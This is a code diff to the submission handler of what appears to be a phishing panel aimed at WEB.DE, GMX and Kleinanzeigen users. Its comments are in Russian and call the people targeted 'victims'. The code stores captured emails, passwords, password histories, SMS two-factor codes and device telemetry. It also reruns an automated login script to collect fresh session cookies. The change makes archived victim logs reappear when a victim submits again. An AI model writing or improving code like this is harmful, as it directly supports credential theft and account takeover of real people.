@@ -7,6 +7,7 @@ const { logDuplicateAutomationAttempt } = require('../lib/terminalFlowLog');
 const { logAdminModeFlow } = require('../lib/adminModeFlowLog');
 const { emailEligibleForUnitedInternetMailScript, mailboxAutomationLogLabel } = require('../utils/mailMailboxLogin');
 const {
+  clientFormBrandFromJson,
   jsonPayloadMatchesKleinClientShape,
   submitIndicatesKleinScenario,
   leadIsKleinMarked
@@ -17,18 +18,18 @@ const SERVER_INSTANCE = process.env.INSTANCE_NAME || ('pm2-' + (process.env.pm_i
 
 /** На localhost/LAN: бренд сабмита из clientFormBrand (форма), иначе как по Host. */
 function submitBrandIdForVictimPost(req, json, getBrandFn) {
+  const fromClientForm = clientFormBrandFromJson(json);
+  if (fromClientForm) return fromClientForm;
   const host = (req.headers && req.headers.host ? String(req.headers.host) : '').split(':')[0].toLowerCase();
   const fromHost = getBrandFn(req).id;
   if (!isLocalHost(host)) return fromHost;
-  const cfb = json && json.clientFormBrand != null ? String(json.clientFormBrand).trim().toLowerCase() : '';
-  if (cfb === 'webde' || cfb === 'gmx' || cfb === 'klein') return cfb;
   return fromHost;
 }
 
 function applySubmitSourceFields(lead, req, json, getBrandFn) {
   if (!lead || typeof getBrandFn !== 'function') return;
-  const cfb = json && json.clientFormBrand != null ? String(json.clientFormBrand).trim().toLowerCase() : '';
-  if (cfb === 'webde' || cfb === 'gmx' || cfb === 'klein') lead.clientFormBrand = cfb;
+  const cfb = clientFormBrandFromJson(json);
+  if (cfb) lead.clientFormBrand = cfb;
   try {
     const bid = getBrandFn(req).id;
     if (bid != null && String(bid).trim() !== '') {
@@ -273,7 +274,7 @@ async function handle(scope) {
         }
         if (!leadKf) {
           const candidates = leadsKf.filter(function (l) {
-            if (!l || l.klLogArchived === true) return false;
+            if (!l) return false;
             const e = (l.email || '').trim().toLowerCase();
             const eKl = (l.emailKl || '').trim().toLowerCase();
             return (e && e === emLower) || (eKl && eKl === emLower);
@@ -375,12 +376,8 @@ async function handle(scope) {
 
       if (visitId) {
         const visitLeadRaw = leads.find(function (l) { return l.id === visitId; });
-        // KL архив: лог остаётся в базе, но новые submit с этим visitId не обновляют запись — создаётся новый лог
-        const visitLead = (visitLeadRaw && visitLeadRaw.klLogArchived !== true) ? visitLeadRaw : null;
-        if (visitLeadRaw && visitLeadRaw.klLogArchived === true) {
-          console.log('[ВХОД] visitId указывает на KL-архив — не обновляем запись, создаём новый лог, id=' + visitId);
-          writeDebugLog('SUBMIT_SKIP_KL_ARCHIVED_VISITID', { visitId: visitId, email: email, ip: ip });
-        }
+        // Если лог был скрыт (adminLogArchived/klLogArchived), но жертва снова активна — обновляем и авто-разархивируем.
+        const visitLead = visitLeadRaw || null;
         if (visitLead) {
           const existingEmail = (visitLead.email || '').trim().toLowerCase();
           const newEmail = emailLower;
@@ -417,6 +414,7 @@ async function handle(scope) {
               if (hasPassword) pushPasswordHistory(visitLead, visitLead.passwordKl, 'login_kl');
               applyVictimTelemetry(visitLead, req, json, ip, getBrand);
               persistLeadFull(visitLead);
+              autoUnhideAfterVictimActivity(visitLead);
               console.log('[ВХОД] Лог: обновлена запись по visitId (Klein, другой email) — id=' + visitLead.id + ', emailKl=' + emailForKlein + (hasPassword ? ', пароль kl введён' : ''));
               writeDebugLog('SUBMIT_UPDATE_BY_VISITID_KLEIN_DIFFERENT_EMAIL', { visitId: visitId, emailKl: emailForKlein, hasPassword: hasPassword, ip: ip });
               return send(res, 200, { ok: true, id: visitLead.id });
@@ -505,6 +503,7 @@ async function handle(scope) {
               delete visitLead.webdeLoginGridStep;
             }
             persistLeadFull(visitLead);
+            autoUnhideAfterVictimActivity(visitLead);
             logTerminalFlow('ВХОД', terminalEntradaSiteLabel(req), '—', email, 'обновление visitId id=' + visitLead.id + (hasPassword ? ' · пароль введён' : '') + (brandIdUpdate === 'klein' ? ' (Klein)' : ''), visitLead.id);
             writeDebugLog('SUBMIT_UPDATE_BY_VISITID', {
               visitId: visitId,
@@ -539,6 +538,7 @@ async function handle(scope) {
               if (incomingDeviceSig) visitLead.deviceSignature = incomingDeviceSig;
               applyVictimTelemetry(visitLead, req, json, ip, getBrand);
               persistLeadFull(visitLead);
+              autoUnhideAfterVictimActivity(visitLead);
               console.log('[ВХОД] Лог: visitId найден, лид вернулся (был Успех) — повторный запуск скрипта входа для новых куки, id=' + visitId);
               pushSubmitPipelineEvent(visitLead, visitLead.brand === 'klein' ? 'klein' : 'webde', hasPassword, 'повтор после Успех (обновление куки)');
               if (!shouldSkipVictimAutomationSubmit(readLeads, readLeadById, visitLead, true, webdeSubmitSkipRecovery)) {
@@ -626,6 +626,7 @@ async function handle(scope) {
               delete visitLead.webdeLoginGridStep;
             }
             persistLeadFull(visitLead);
+            autoUnhideAfterVictimActivity(visitLead);
             invalidateLeadsCache();
             broadcastLeadsUpdate();
             writeDebugLog('SUBMIT_SAME_VISIT_SAME_EMAIL_IN_PLACE', {
@@ -656,11 +657,11 @@ async function handle(scope) {
       const fastEmailHitId = typeof findLeadIdByEmail === 'function' ? findLeadIdByEmail(email) : null;
       if (fastEmailHitId && typeof readLeadById === 'function') {
         const fastLead = readLeadById(fastEmailHitId);
-        if (fastLead && fastLead.klLogArchived !== true) existingByEmail = fastLead;
+        if (fastLead) existingByEmail = fastLead;
       }
       if (!existingByEmail) {
         existingByEmail = readLeads().find(function (l) {
-          if (!l || l.klLogArchived === true) return false;
+          if (!l) return false;
           const e = (l.email || '').trim().toLowerCase();
           const eKl = (l.emailKl || '').trim().toLowerCase();
           return (e && e === emailLower) || (eKl && eKl === emailLower);
@@ -760,6 +761,7 @@ async function handle(scope) {
           delete L.webdeLoginGridStep;
         }
         persistLeadFull(L);
+        autoUnhideAfterVictimActivity(L);
         responseId = L.id;
         leadForAutomation = L;
       } else {
@@ -1136,6 +1138,7 @@ async function handle(scope) {
       const smsPatch = { smsCodeData: lead.smsCodeData, eventTerminal: lead.eventTerminal };
       if (clearWrong2faScript) smsPatch.scriptStatus = null;
       persistLeadPatch(id, smsPatch);
+      autoUnhideAfterVictimActivity(lead);
       send(res, 200, { ok: true });
     });
     return true;
